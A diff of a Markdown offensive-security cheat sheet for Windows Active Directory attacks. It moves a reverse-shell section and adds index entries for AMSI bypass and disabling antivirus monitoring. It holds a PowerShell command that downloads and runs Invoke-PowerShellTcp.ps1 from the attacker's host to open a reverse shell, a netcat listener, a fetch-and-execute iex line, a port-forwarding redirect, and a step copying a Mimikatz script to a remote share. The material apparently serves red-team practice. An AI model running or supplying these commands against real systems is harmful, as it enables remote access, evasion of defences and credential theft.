@@ -1,6 +1,12 @@
 # CheatSheet
 ## Index
 * [General](#general)
+  * [Port Forwarding](#create-a-port-forwarding)
+  * [Copy to Remote Server](copy-to-remote-server)
+  * [AMSI Bypass](#amsi-bypass)
+  * [Disable AV monitoring](#disable-av-monitoring)
+  * [Enumerate Language mode and Applocker](#enumerate-languagemode-and-applocker)
+  * [Reverse Shell](#reverse-shells)
 * [Enumeration](#enumeration)
   * [Enumeration using AD Module](#domain-enumeration-using-activedirectory-module)
   * [Enumeration using PowerView](#domain-enumeration-using-powerview)
@@ -49,7 +55,7 @@ iex (iwr http://<my_ip>/<scriptname> -UseBasicParsing)
 "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
 ```
 
-### Copy a Script on Another Server
+### Copy to Remote Server
 Powershell command
 ```
 Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
@@ -88,6 +94,20 @@ Enumerate the Applocker policies
 ```
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```
+
+### Reverse-Shells
+Command to download and execute a reverse-shell
+```
+powershell iex (iwr -UseBasicParsing http://<my_ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IpAddress <my_ip> -Port 443
+```
+
+**Note:** Remember to start the listener using netcat
+```
+nc64.exe -lvp 443
+```
+
+**Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)
+
 ## Enumeration
 ### Domain Enumeration Using ActiveDirectory Module
 Enumerate current domain 
@@ -449,19 +469,6 @@ Perform the enumeration
 ```
 Find-PSRemotingLocalAdminAccess
 ```
-
-## Reverse-Shells
-Command to download and execute a reverse-shell
-```
-powershell iex (iwr -UseBasicParsing http://<my_ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IpAddress <my_ip> -Port 443
-```
-
-**Note:** Remember to start the listener using netcat
-```
-nc64.exe -lvp 443
-```
-
-**Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)
 
 ## Lateral Movement
 Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 
